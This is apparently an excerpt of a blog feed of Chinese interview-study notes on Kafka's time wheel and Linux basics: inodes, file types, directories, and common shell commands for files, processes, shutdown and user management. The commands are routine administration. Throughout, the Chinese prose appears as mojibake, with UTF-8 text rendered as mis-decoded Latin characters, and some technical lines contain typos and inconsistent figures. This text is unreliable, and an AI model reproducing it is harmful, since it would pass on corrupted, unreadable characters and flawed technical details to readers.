<li>æ—¶é—´è½®æ˜¯ä»€ä¹ˆï¼Ÿå…¶å®æ—¶é—´è½®è¯´ç™½å…¶å®å°±æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚tickMs:æ—¶é—´è½®é—´éš” 1ms wheelSizeï¼šæ—¶é—´è½®å¤§å° 20 intervalï¼štimckMS * whellSizeï¼Œä¸€ä¸ªæ—¶é—´è½®çš„æ€»çš„æ—¶é—´è·¨åº¦ã€‚20ms currentTimeï¼šå½“æ—¶æ—¶é—´çš„æŒ‡é’ˆã€‚a:å› ä¸ºæ—¶é—´è½®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥è¦è·å–é‡Œé¢æ•°æ®çš„æ—¶å€™ï¼Œé çš„æ˜¯indexï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯O(1) b:æ•°ç»„æŸä¸ªä½ç½®ä¸Šå¯¹åº”çš„ä»»åŠ¡ï¼Œç”¨çš„æ˜¯åŒå‘é“¾è¡¨å­˜å‚¨çš„ï¼Œå¾€åŒå‘é“¾è¡¨é‡Œé¢æ’å…¥ï¼Œåˆ é™¤ä»»åŠ¡ï¼Œæ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯Oï¼ˆ1ï¼‰ ä¸¾ä¾‹ï¼šæ’å…¥ä¸€ä¸ª8msä»¥åè¦æ‰§è¡Œçš„ä»»åŠ¡ 19ms 3.å¤šå±‚çº§çš„æ—¶é—´è½® æ¯”å¦‚ï¼šè¦æ’å…¥ä¸€ä¸ª110æ¯«ç§’ä»¥åè¿è¡Œçš„ä»»åŠ¡ã€‚tickMs:æ—¶é—´è½®é—´éš” 20ms wheelSizeï¼šæ—¶é—´è½®å¤§å° 20 intervalï¼štimckMS * whellSizeï¼Œä¸€ä¸ªæ—¶é—´è½®çš„æ€»çš„æ—¶é—´è·¨åº¦ã€‚20ms currentTimeï¼šå½“æ—¶æ—¶é—´çš„æŒ‡é’ˆã€‚ç¬¬ä¸€å±‚æ—¶é—´è½®ï¼š1ms * 20 ç¬¬äºŒå±‚æ—¶é—´è½®ï¼š20ms * 20 ç¬¬ä¸‰å±‚æ—¶é—´è½®ï¼š400ms * 20</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0c99ba8e63f543a09afaebcaef61a9a5~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>å¤§æ•°æ®</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2022/03/01/%E9%9D%A2%E8%AF%95/Linux/</url>
    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux-æ–‡ä»¶ç³»ç»Ÿ"><a href="#Linux-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Linux æ–‡ä»¶ç³»ç»Ÿ"></a>Linux æ–‡ä»¶ç³»ç»Ÿ</h2><h3 id="inode-ä»‹ç»"><a href="#inode-ä»‹ç»" class="headerlink" title="inode ä»‹ç»"></a>inode ä»‹ç»</h3><p><strong>inode æ˜¯ linux&#x2F;unix æ–‡ä»¶ç³»ç»Ÿçš„åŸºç¡€ã€‚</strong></p>
<p>ç¡¬ç›˜çš„æœ€å°å­˜å‚¨å•ä½æ˜¯æ‰‡åŒºï¼ˆSectorï¼‰ï¼Œå—ï¼ˆblockï¼‰ç”±å¤šä¸ªæ‰‡åŒºç»„æˆã€‚æ–‡ä»¶æ•°æ®å­˜å‚¨åœ¨å—ä¸­ã€‚å—çš„æœ€å¸¸è§çš„å¤§å°æ˜¯ 4kbï¼Œçº¦ä¸º 8 ä¸ªè¿ç»­çš„æ‰‡åŒºç»„æˆï¼ˆæ¯ä¸ªæ‰‡åŒºå­˜å‚¨ 512 å­—èŠ‚ï¼‰ã€‚ä¸€ä¸ªæ–‡ä»¶å¯èƒ½ä¼šå ç”¨å¤šä¸ª blockï¼Œä½†æ˜¯ä¸€ä¸ªå—åªèƒ½å­˜æ”¾ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<p>è™½ç„¶ï¼Œå°†æ–‡ä»¶å­˜å‚¨åœ¨äº†å—ï¼ˆblockï¼‰ä¸­ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸€ä¸ªç©ºé—´æ¥å­˜å‚¨æ–‡ä»¶çš„ å…ƒä¿¡æ¯ metadata ï¼šå¦‚æŸä¸ªæ–‡ä»¶è¢«åˆ†æˆå‡ å—ã€æ¯ä¸€å—åœ¨çš„åœ°å€ã€æ–‡ä»¶æ‹¥æœ‰è€…ï¼Œåˆ›å»ºæ—¶é—´ï¼Œæƒé™ï¼Œå¤§å°ç­‰ã€‚è¿™ç§å­˜å‚¨æ–‡ä»¶å…ƒä¿¡æ¯çš„åŒºåŸŸå°±å« inodeï¼Œè¯‘ä¸ºç´¢å¼•èŠ‚ç‚¹ï¼šiï¼ˆindexï¼‰+nodeã€‚æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ª inodeï¼Œå­˜å‚¨æ–‡ä»¶çš„å…ƒä¿¡æ¯ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ stat å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„ inode ä¿¡æ¯ã€‚æ¯ä¸ª inode éƒ½æœ‰ä¸€ä¸ªå·ç ï¼ŒLinux&#x2F;Unix æ“ä½œç³»ç»Ÿä¸ä½¿ç”¨æ–‡ä»¶åæ¥åŒºåˆ†æ–‡ä»¶ï¼Œè€Œæ˜¯ä½¿ç”¨ inode å·ç åŒºåˆ†ä¸åŒçš„æ–‡ä»¶ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼šinodeå°±æ˜¯ç”¨æ¥ç»´æŠ¤æŸä¸ªæ–‡ä»¶è¢«åˆ†æˆå‡ å—ã€æ¯ä¸€å—åœ¨çš„åœ°å€ã€æ–‡ä»¶æ‹¥æœ‰è€…ï¼Œåˆ›å»ºæ—¶é—´ï¼Œæƒé™ï¼Œå¤§å°ç­‰ä¿¡æ¯ã€‚</p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>inode ï¼šè®°å½•æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ stat å‘½ä»¤æŸ¥çœ‹ inode ä¿¡æ¯ã€‚</li>
<li>block ï¼šå®é™…æ–‡ä»¶çš„å†…å®¹ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶å¤§äºä¸€ä¸ªå—æ—¶å€™ï¼Œé‚£ä¹ˆå°†å ç”¨å¤šä¸ª blockï¼Œä½†æ˜¯ä¸€ä¸ªå—åªèƒ½å­˜æ”¾ä¸€ä¸ªæ–‡ä»¶ã€‚ï¼ˆå› ä¸ºæ•°æ®æ˜¯ç”± inode æŒ‡å‘çš„ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªæ–‡ä»¶çš„æ•°æ®å­˜æ”¾åœ¨åŒä¸€ä¸ªå—ä¸­ï¼Œå°±ä¼šä¹±å¥—äº†ï¼‰</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848586.png" alt="image-20210502150535276"></p>
<h3 id="Linux-æ–‡ä»¶ç±»å‹"><a href="#Linux-æ–‡ä»¶ç±»å‹" class="headerlink" title="Linux æ–‡ä»¶ç±»å‹"></a>Linux æ–‡ä»¶ç±»å‹</h3><p>Linux æ”¯æŒå¾ˆå¤šæ–‡ä»¶ç±»å‹ï¼Œå…¶ä¸­éå¸¸é‡è¦çš„æ–‡ä»¶ç±»å‹æœ‰ï¼šæ™®é€šæ–‡ä»¶ï¼Œç›®å½•æ–‡ä»¶ï¼Œé“¾æ¥æ–‡ä»¶ï¼Œè®¾å¤‡æ–‡ä»¶ï¼Œç®¡é“æ–‡ä»¶ï¼ŒSocket å¥—æ¥å­—æ–‡ä»¶ç­‰ã€‚</p>
<ul>
<li>æ™®é€šæ–‡ä»¶ï¼ˆ-ï¼‰ ï¼š ç”¨äºå­˜å‚¨ä¿¡æ¯å’Œæ•°æ®ï¼Œ Linuxç”¨æˆ·å¯ä»¥æ ¹æ®è®¿é—®æƒé™å¯¹æ™®é€šæ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹ã€æ›´æ”¹å’Œåˆ é™¤ã€‚æ¯”å¦‚ï¼šå›¾ç‰‡ã€å£°éŸ³ã€PDFã€textã€è§†é¢‘ã€æºä»£ç ç­‰ç­‰ã€‚</li>
<li>ç›®å½•æ–‡ä»¶ï¼ˆdï¼Œdirectory fileï¼‰ ï¼šç›®å½•ä¹Ÿæ˜¯æ–‡ä»¶çš„ä¸€ç§ï¼Œç”¨äºè¡¨ç¤ºå’Œç®¡ç†ç³»ç»Ÿä¸­çš„æ–‡ä»¶ï¼Œç›®å½•æ–‡ä»¶ä¸­åŒ…å«ä¸€äº›æ–‡ä»¶åå’Œå­ç›®å½•åã€‚æ‰“å¼€ç›®å½•äº‹å®ä¸Šå°±æ˜¯æ‰“å¼€ç›®å½•æ–‡ä»¶ã€‚</li>
<li>ç¬¦å·é“¾æ¥æ–‡ä»¶ï¼ˆlï¼Œsymbolic linkï¼‰ ï¼šä¿ç•™äº†æŒ‡å‘æ–‡ä»¶çš„åœ°å€è€Œä¸æ˜¯æ–‡ä»¶æœ¬èº«ã€‚</li>
<li>å­—ç¬¦è®¾å¤‡ï¼ˆcï¼Œcharï¼‰ ï¼šç”¨æ¥è®¿é—®å­—ç¬¦è®¾å¤‡æ¯”å¦‚ç¡¬ç›˜ã€‚</li>
<li>è®¾å¤‡æ–‡ä»¶ï¼ˆbï¼Œblockï¼‰ ï¼š ç”¨æ¥è®¿é—®å—è®¾å¤‡æ¯”å¦‚ç¡¬ç›˜ã€è½¯ç›˜ã€‚</li>
<li>ç®¡é“æ–‡ä»¶ï¼ˆpï¼Œpipeï¼‰ï¼šä¸€ç§ç‰¹æ®Šç±»å‹çš„æ–‡ä»¶ï¼Œç”¨äºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</li>
<li>å¥—æ¥å­—ï¼ˆsï¼Œsocketï¼‰ï¼šç”¨äºè¿›ç¨‹é—´çš„ç½‘ç»œé€šä¿¡ï¼Œä¹Ÿå¯ä»¥ç”¨äºæœ¬æœºä¹‹é—´çš„éç½‘ç»œé€šä¿¡ã€‚</li>
</ul>
<h3 id="Linux-ç›®å½•æ ‘"><a href="#Linux-ç›®å½•æ ‘" class="headerlink" title="Linux ç›®å½•æ ‘"></a>Linux ç›®å½•æ ‘</h3><p>æ‰€æœ‰å¯æ“ä½œçš„è®¡ç®—æœºèµ„æºéƒ½å­˜åœ¨äºç›®å½•æ ‘è¿™ä¸ªç»“æ„ä¸­ï¼Œå¯¹è®¡ç®—èµ„æºçš„è®¿é—®ï¼Œå¯ä»¥çœ‹åšæ˜¯å¯¹è¿™æ£µç›®å½•æ ‘çš„è®¿é—®ã€‚</p>
<p><strong>Linux çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</strong></p>
<p>Linux æ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„å±‚æ¬¡é²œæ˜ï¼Œå°±åƒä¸€æ£µå€’ç«‹çš„æ ‘ï¼Œæœ€é¡¶å±‚æ˜¯å…¶æ ¹ç›®å½•ï¼š </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848885.png" alt="Linuxç›®å½•æ ‘"></p>
<p>å¸¸è§ç›®å½•è¯´æ˜ï¼š</p>
<ul>
<li>&#x2F;binï¼šå­˜æ”¾äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆlsã€catã€mkdir ç­‰ï¼‰ï¼Œå¸¸ç”¨å‘½ä»¤ä¸€èˆ¬éƒ½åœ¨è¿™é‡Œã€‚</li>
<li>&#x2F;etcï¼šå­˜æ”¾ç³»ç»Ÿç®¡ç†å’Œé…ç½®æ–‡ä»¶ã€‚</li>
<li>&#x2F;homeï¼šå­˜æ”¾æ‰€æœ‰ç”¨æˆ·æ–‡ä»¶çš„æ ¹ç›®å½•ï¼Œæ˜¯ç”¨æˆ·ä¸»ç›®å½•çš„åŸºç‚¹ï¼Œæ¯”å¦‚ç”¨æˆ· user çš„ä¸»ç›®å½•å°±æ˜¯&#x2F;home&#x2F;userï¼Œå¯ä»¥ç”¨~user è¡¨ç¤ºã€‚</li>
<li>&#x2F;usr ï¼šç”¨äºå­˜æ”¾ç³»ç»Ÿåº”ç”¨ç¨‹åºã€‚</li>
<li>&#x2F;optï¼šé¢å¤–å®‰è£…çš„å¯é€‰åº”ç”¨ç¨‹åºåŒ…æ‰€æ”¾ç½®çš„ä½ç½®ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯ä»¥æŠŠ tomcat ç­‰éƒ½å®‰è£…åˆ°è¿™é‡Œã€‚</li>
<li>&#x2F;procï¼šè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿç›®å½•ï¼Œæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ã€‚å¯ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ã€‚</li>
<li>&#x2F;rootï¼šè¶…çº§ç”¨æˆ·ï¼ˆç³»ç»Ÿç®¡ç†å‘˜ï¼‰çš„ä¸»ç›®å½•ï¼ˆç‰¹æƒé˜¶çº§ï¼‰ã€‚</li>
<li>&#x2F;sbinï¼šå­˜æ”¾äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªæœ‰ root æ‰èƒ½è®¿é—®ã€‚è¿™é‡Œå­˜æ”¾çš„æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿçº§åˆ«çš„ç®¡ç†å‘½ä»¤å’Œç¨‹åºã€‚å¦‚ ifconfig ç­‰ã€‚</li>
<li>&#x2F;devï¼š ç”¨äºå­˜æ”¾è®¾å¤‡æ–‡ä»¶ã€‚</li>
<li>&#x2F;mntï¼š ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿçš„å®‰è£…ç‚¹ï¼Œç³»ç»Ÿæä¾›è¿™ä¸ªç›®å½•æ˜¯è®©ç”¨æˆ·ä¸´æ—¶æŒ‚è½½å…¶ä»–çš„æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li>&#x2F;bootï¼š å­˜æ”¾ç”¨äºç³»ç»Ÿå¼•å¯¼æ—¶ä½¿ç”¨çš„å„ç§æ–‡ä»¶ã€‚</li>
<li>&#x2F;lib ï¼š å­˜æ”¾ç€å’Œç³»ç»Ÿè¿è¡Œç›¸å…³çš„åº“æ–‡ä»¶ã€‚</li>
<li>&#x2F;tmpï¼š ç”¨äºå­˜æ”¾å„ç§ä¸´æ—¶æ–‡ä»¶ï¼Œæ˜¯å…¬ç”¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç‚¹ã€‚</li>
<li>&#x2F;varï¼š ç”¨äºå­˜æ”¾è¿è¡Œæ—¶éœ€è¦æ”¹å˜æ•°æ®çš„æ–‡ä»¶ï¼Œä¹Ÿæ˜¯æŸäº›å¤§æ–‡ä»¶çš„æº¢å‡ºåŒºï¼Œæ¯”æ–¹è¯´å„ç§æœåŠ¡çš„æ—¥å¿—æ–‡ä»¶ï¼ˆç³»ç»Ÿå¯åŠ¨æ—¥å¿—ç­‰ï¼‰ç­‰ã€‚</li>
<li>&#x2F;lost+foundï¼š è¿™ä¸ªç›®å½•å¹³æ—¶æ˜¯ç©ºçš„ï¼Œç³»ç»Ÿéæ­£å¸¸å…³æœºè€Œç•™ä¸‹â€œæ— å®¶å¯å½’â€çš„æ–‡ä»¶ï¼ˆwindows ä¸‹å«ä»€ä¹ˆ.chkï¼‰å°±åœ¨è¿™é‡Œã€‚</li>
</ul>
<h2 id="Linux-åŸºæœ¬å‘½ä»¤"><a href="#Linux-åŸºæœ¬å‘½ä»¤" class="headerlink" title="Linux åŸºæœ¬å‘½ä»¤"></a>Linux åŸºæœ¬å‘½ä»¤</h2><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>åœ¨Linuxé‡Œé¢æ€»æ˜¯â€œç™½å‘äººé€é»‘å‘äººâ€ï¼Œå­è¿›ç¨‹æ­»äº¡ï¼Œçˆ¶è¿›ç¨‹é€è¿‡wait()ç­‰å¾…å­è¿›ç¨‹æ­»äº¡ï¼Œå¹¶æ¸…ç†å­è¿›ç¨‹åƒµå°¸ï¼Œå½“ç„¶çˆ¶è¿›ç¨‹ä¹Ÿå¯ä»¥å› æ­¤è€Œè·å¾—å­è¿›ç¨‹çš„æ­»äº¡åŸå› ã€‚</p>
<p>kill çˆ¶è¿›ç¨‹ï¼Œå­è¿›ç¨‹å¯èƒ½ä¼šæ­»äº¡ï¼›å®é™…æƒ…å†µæ˜¯è¿™ä¸¤ç§æƒ…å†µéƒ½æœ‰å¯èƒ½å‘ç”Ÿï¼Œå–å†³Aè¿›ç¨‹çš„çŠ¶æ€ã€‚å¦‚æœAè¿›ç¨‹æ˜¯ä¼šè¯é¦–è¿›ç¨‹ï¼Œé‚£ä¹ˆAé€€å‡ºåï¼ŒBè¿›ç¨‹ä¹Ÿä¼šé€€å‡ºï¼›åä¹‹å¦‚æœAè¿›ç¨‹ä¸æ˜¯ä¼šè¯é¦–è¿›ç¨‹ï¼Œé‚£ä¹ˆAé€€å‡ºåï¼ŒBè¿›ç¨‹ä¸ä¼šé€€å‡ºã€‚</p>
<h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">é€šè¿‡<span class="built_in">alias</span>å‘½ä»¤å¯ä»¥æŸ¥çœ‹å‘½ä»¤åˆ«å</span></span><br><span class="line">alias</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®šä¹‰æ–°çš„åˆ«å</span></span><br><span class="line">alias rmall = &#x27;rm -rf&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å–æ¶ˆåˆ«å</span></span><br><span class="line">unalias rmall</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢åˆ°ç”¨æˆ·ä¸»ç›®å½•</span></span><br><span class="line">cd ~</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªæ“ä½œæ‰€åœ¨ç›®å½•</span></span><br><span class="line">cd -</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–‡ä»¶çš„åˆ›å»ºï¼ˆå¢ï¼‰</span></span><br><span class="line">touch æ–‡ä»¶å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–‡ä»¶æŸ¥çœ‹</span> </span><br><span class="line">cat/more/less/tail æ–‡ä»¶åç§°</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¯ä»¥å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡ŒåŠ¨æ€ç›‘æ§</span></span><br><span class="line">tail -f æ–‡ä»¶</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¼€æœºè‡ªå¯</span></span><br><span class="line">chmod +x zookeeper</span><br><span class="line">chkconfig --add zookeeper</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸ</span></span><br><span class="line">chkconfig --list</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">global search regular expression</span></span><br><span class="line">grep è¦æœç´¢çš„å­—ç¬¦ä¸² è¦æœç´¢çš„æ–‡ä»¶ --color</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ­£åœ¨è¿è¡Œè¿›ç¨‹</span></span><br><span class="line">ps -ef</span><br><span class="line">ps -aux</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ç«¯å£ä½¿ç”¨</span></span><br><span class="line">netstat -an</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">VIM</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‹·è´å½“å‰è¡Œ yy , æ‹·è´å½“å‰è¡Œå‘ä¸‹çš„ 5 è¡Œ 5yyï¼Œå¹¶ç²˜è´´ pã€‚ã€å¿«æ·é”®åœ¨æ­£å¸¸æ¨¡å¼ä¸‹ä½¿ç”¨ã€‘</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤å½“å‰è¡Œ <span class="built_in">dd</span> , åˆ é™¤å½“å‰è¡Œå‘ä¸‹çš„ 5 è¡Œ 5dd</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾æŸä¸ªå•è¯ (å‘½ä»¤æ¨¡å¼ä¸‹ /å…³é”®å­— ï¼Œ å›è½¦ æŸ¥æ‰¾ , è¾“å…¥ n å°±æ˜¯æŸ¥æ‰¾ä¸‹ä¸€ä¸ª)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®æ–‡ä»¶çš„è¡Œå·ï¼Œå–æ¶ˆæ–‡ä»¶çš„è¡Œå·.[å‘½ä»¤è¡Œä¸‹ : <span class="built_in">set</span> nu å’Œ :<span class="built_in">set</span> nonu]</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¼–è¾‘ /etc/profile æ–‡ä»¶ï¼Œä½¿ç”¨å¿«æ·é”®åˆ°åº•æ–‡æ¡£çš„æœ€æœ«è¡Œ[G]å’Œæœ€é¦–è¡Œ[gg] ã€æ­£å¸¸æ¨¡å¼ä¸‹ã€‘</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­è¾“å…¥ â€œhelloâ€ ,ç„¶ååˆæ’¤é”€è¿™ä¸ªåŠ¨ä½œ u ã€æ­£å¸¸æ¨¡å¼ä¸‹ã€‘</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¼–è¾‘ /etc/profile æ–‡ä»¶ï¼Œå¹¶å°†å…‰æ ‡ç§»åŠ¨åˆ° 20 è¡Œ <span class="built_in">shift</span>+g</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">set</span> nu</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">:20</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç«‹åˆ»å…³æœº</span></span><br><span class="line">shutdown -h now</span><br><span class="line"><span class="meta">#</span><span class="language-bash">1åˆ†é’Ÿåå…³æœº</span></span><br><span class="line">shutdown -h 1</span><br><span class="line">shutdown -r now</span><br><span class="line">shutdown -r 1</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŒ‡å®š 5 åˆ†é’Ÿåå…³æœºï¼ŒåŒæ—¶é€å‡ºè­¦å‘Šä¿¡æ¯ç»™ç™»å…¥ç”¨æˆ·</span></span><br><span class="line">shutdown +5 &quot;System will shutdown after 5 minutes&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç«‹åˆ»å…³æœº</span></span><br><span class="line">halt </span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç«‹åˆ»é‡å¯</span></span><br><span class="line">reboot  </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨é‡å¯å’Œå…³æœºå‰ï¼Œé€šå¸¸éœ€è¦å…ˆæ‰§è¡Œï¼ŒæŠŠå†…å­˜çš„æ•°æ®ï¼Œå†™å…¥ç£ç›˜</span></span><br><span class="line">sync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¼šè‡ªåŠ¨åˆ›å»ºç”¨æˆ·ç»„</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä½¿ç”¨useraddæŒ‡ä»¤æ‰€å»ºç«‹çš„å¸å·ï¼Œå®é™…ä¸Šæ˜¯ä¿å­˜åœ¨ /etc/passwdæ–‡æœ¬æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line">useradd xiaoming</span><br><span class="line">passwd xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ˜¾ç¤ºç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯</span></span><br><span class="line">passwd -S ç”¨æˆ·å</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¸…é™¤ç”¨æˆ·å¯†ç </span></span><br><span class="line">passwd -d ç”¨æˆ·å</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç›®å½•ä¿ç•™</span></span><br><span class="line">userdel xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤ç›®å½•</span></span><br><span class="line">userdel -r xiaoming</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">id mingwhuang</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢ç”¨æˆ·</span></span><br><span class="line">su</span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿”å›åŸæ¥çš„ç”¨æˆ·</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç”¨æˆ·ç»„çš„ç®¡ç†æ¶‰åŠç”¨æˆ·ç»„çš„æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹ã€‚ç»„çš„å¢åŠ ã€åˆ é™¤å’Œä¿®æ”¹å®é™…ä¸Šå°±æ˜¯å¯¹/etc/groupæ–‡ä»¶çš„æ›´æ–°ã€‚</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–°å¢ç»„</span></span><br><span class="line">groupadd ç»„å</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¢åŠ ç”¨æˆ·æ˜¯ç›´æ¥åŠ ä¸Šç»„</span></span><br><span class="line">useradd -g ç”¨æˆ·ç»„ ç”¨æˆ·å</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ é™¤ç»„ï¼Œç»„å†…ä¸èƒ½æœ‰ç”¨æˆ·</span></span><br><span class="line">groupdel ç»„å</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹ç”¨æˆ·ç»„çš„å±æ€§</span></span><br><span class="line">groupmod é€‰é¡¹ ç”¨æˆ·ç»„</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹ç”¨æˆ·ç»„</span></span><br><span class="line">usermod -g æ–°çš„ç»„å ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">man ls</span><br><span class="line">help ls</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ˜¾ç¤ºéšè—æ–‡ä»¶</span></span><br><span class="line">ls -la</span><br><span class="line">ll</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ›å»ºå¤šçº§ç›®å½•ç”¨-på‚æ•°</span></span><br><span class="line">mkdir -p /home/test</span><br><span class="line">rmdir</span><br><span class="line"><span class="meta"># </span><span class="language-bash">é€’å½’åˆ é™¤ï¼Œå¼ºåˆ¶åˆ é™¤</span></span><br><span class="line">rm -rf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ›å»ºç©ºæ–‡ä»¶</span></span><br><span class="line">touch</span><br><span class="line">cp [é€‰é¡¹] sourceã€æºã€‘ destã€ç›®çš„æ–‡ä»¶ã€‘ </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å›åˆ°å®¶ç›®å½•</span></span><br><span class="line">cd </span><br><span class="line">cd ~</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å›åˆ°æ ¹</span></span><br><span class="line">cd /</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">cat</span> åªèƒ½æµè§ˆæ–‡ä»¶ï¼Œè€Œä¸èƒ½ä¿®æ”¹æ–‡ä»¶ï¼Œä¸ºäº†æµè§ˆæ–¹ä¾¿ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸Š ç®¡é“å‘½ä»¤ | more</span></span><br><span class="line">cat test.txt | more #(æŠŠ cat xxx.txt è¾“å‡ºç»“æœäº¤ç»™ more å¤„ç†)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">more æŒ‡ä»¤æ˜¯ä¸€ä¸ªåŸºäº VI ç¼–è¾‘å™¨çš„æ–‡æœ¬è¿‡æ»¤å™¨ï¼Œå®ƒä»¥å…¨å±å¹•çš„æ–¹å¼æŒ‰é¡µæ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ã€‚moreæŒ‡ä»¤ä¸­å†…ç½®äº†è‹¥å¹²å¿«æ·é”®</span></span><br><span class="line">more text.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">less 